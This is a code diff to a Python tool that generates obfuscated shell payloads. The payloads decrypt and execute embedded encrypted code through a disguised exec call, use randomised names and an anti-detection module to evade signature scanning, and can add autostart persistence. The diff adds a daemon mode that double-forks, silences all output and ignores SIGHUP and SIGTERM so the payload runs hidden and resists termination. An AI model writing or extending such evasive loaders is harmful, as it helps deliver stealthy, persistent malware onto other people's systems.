@@ -11,7 +11,8 @@ from .anti_detection import create_advanced_evasion_code
 
 
 def gene_shell(encrypted_code, key, output_dir=".", filename=None, add_persistence=False, 
-               anti_detection=True, silent_delay=30, debug_mode=False, strict_mode=True):
+               anti_detection=True, silent_delay=30, debug_mode=False, strict_mode=True, 
+               daemon_mode=False):
     """生成Shell文件
     
     Args:
@@ -24,6 +25,7 @@ def gene_shell(encrypted_code, key, output_dir=".", filename=None, add_persisten
         silent_delay: 静默延迟时间
         debug_mode: 调试模式，True时输出详细日志
         strict_mode: 严格模式，False时降低反检测强度
+        daemon_mode: 守护进程模式，True时自动转入后台运行
     """
     # 随机生成变量名以避免特征检测
     var_names = {
@@ -75,6 +77,8 @@ import random
 {var_s3}=r"ZGVmIGRlY3J5cHQoZGF0YSxrZXkpOgogICAgaWYgZGF0YSA9PSAiIjoKICAgICAgICByZXR1cm4KICAgIHJlc3VsdCA9ICIiCiAgICBrZXljb2RlMSA9IHBhcnNlS2V5KGtleSkKICAgIGEgPSBsZW4oZGF0YSkgLy8gMgogICAgYjEgPSBkYXRhWzphXQogICAgYjIgPSBkYXRhW2E6XQogICAgYyA9IFtvcmQoZCkgZm9yIGQgaW4gYjFdCiAgICBlID0gW2YgLSBrZXljb2RlMSBmb3IgZiBpbiBjXQogICAgZyA9IHN0cihzdW0oYykpCiAgICBrZXljb2RlMiA9IHBhcnNlS2V5KGcpCiAgICBoID0gW29yZChpKSBmb3IgaSBpbiBiMl0KICAgIGogPSBbayAtIGtleWNvZGUyIGZvciBrIGluIGhdCiAgICBrID0gbGVuKGUpIC8vIDIKICAgIGdyb3VwMSA9IGVbOmtdCiAgICBncm91cDQgPSBlW2s6XQogICAgZ3JvdXAyID0gals6a10KICAgIGdyb3VwMyA9IGpbazpdCiAgICBkYXRhbGVuZ3RoID0gbGVuKGdyb3VwMSkgKyBsZW4oZ3JvdXAyKSArIGxlbihncm91cDMpICsgbGVuKGdyb3VwNCkKICAgIGwgPSBkYXRhbGVuZ3RoIC8vIDQKICAgIG0gPSBbXQogICAgZm9yIG4gaW4gcmFuZ2UobCk6CiAgICAgICAgbS5hcHBlbmQoZ3JvdXAxW25dKQogICAgICAgIG0uYXBwZW5kKGdyb3VwMltuXSkKICAgIG8gPSBbXQogICAgZm9yIHAgaW4gcmFuZ2UobCk6CiAgICAgICAgby5hcHBlbmQoZ3JvdXAzW3BdKQogICAgICAgIG8uYXBwZW5kKGdyb3VwNFtwXSkKICAgIHEgPSBtICsgbwogICAgZm9yIHIgaW4gcToKICAgICAgICBpZiBub3Qgcj09MDoKICAgICAgICAgICAgcmVzdWx0ICs9IGNocihyKQogICAgcmV0dXJuIHJlc3VsdAo="
 {var_key} = r"""{key}"""
 
+{daemon_code}
+
 # 避免常见的特征检测
 def {obfuscated_exec}(code):
     getattr(__builtins__, ''.join(['e','x','e','c']))(code)
@@ -115,6 +119,11 @@ if __name__ == "__main__":
     if add_persistence:
         persistence_code = _generate_persistence_code(add_persistence)
     
+    # 守护进程代码
+    daemon_code = ""
+    if daemon_mode:
+        daemon_code = _generate_daemon_code()
+    
     # 调试代码（仅在调试模式下添加）
     debug_code = ""
     debug_exception = ""
@@ -149,7 +158,8 @@ if __name__ == "__main__":
         strict_mode=str(strict_mode),
         debug_code=debug_code,
         debug_exception=debug_exception,
-        add_persistence=str(add_persistence).lower()
+        daemon_code=daemon_code,
+        add_persistence=str(add_persistence)
     )
     
     # 随机生成文件名，使用更通用的名称避免特征检测
@@ -284,8 +294,73 @@ X-GNOME-Autostart-enabled=true
         pass
 
 # 如果启用持久化，尝试设置
-if ''' + str(add_persistence).lower() + ''':
+if ''' + str(add_persistence) + ''':
     _setup_persistence()
+'''
+
+
+def _generate_daemon_code():
+    """生成守护进程代码"""
+    return '''
+# 守护进程代码
+import signal
+
+def daemonize():
+    """将进程转为守护进程(后台运行)"""
+    try:
+        # 检查是否已经是守护进程
+        if os.getppid() == 1:
+            return True
+            
+        # 第一次fork
+        pid = os.fork()
+        if pid > 0:
+            # 父进程退出
+            sys.exit(0)
+    except OSError:
+        return False
+    
+    # 脱离父会话
+    try:
+        os.chdir("/")
+        os.setsid()
+        os.umask(0)
+    except:
+        pass
+    
+    # 第二次fork
+    try:
+        pid = os.fork()
+        if pid > 0:
+            # 父进程退出
+            sys.exit(0)
+    except OSError:
+        return False
+    
+    # 重定向标准输入输出到/dev/null
+    try:
+        sys.stdout.flush()
+        sys.stderr.flush()
+        
+        with open('/dev/null', 'r') as f:
+            os.dup2(f.fileno(), sys.stdin.fileno())
+        with open('/dev/null', 'w') as f:
+            os.dup2(f.fileno(), sys.stdout.fileno())
+            os.dup2(f.fileno(), sys.stderr.fileno())
+    except:
+        pass
+    
+    # 忽略常见信号
+    try:
+        signal.signal(signal.SIGHUP, signal.SIG_IGN)
+        signal.signal(signal.SIGTERM, signal.SIG_IGN)
+    except:
+        pass
+    
+    return True
+
+# 自动转为守护进程
+daemonize()
 '''
 
 
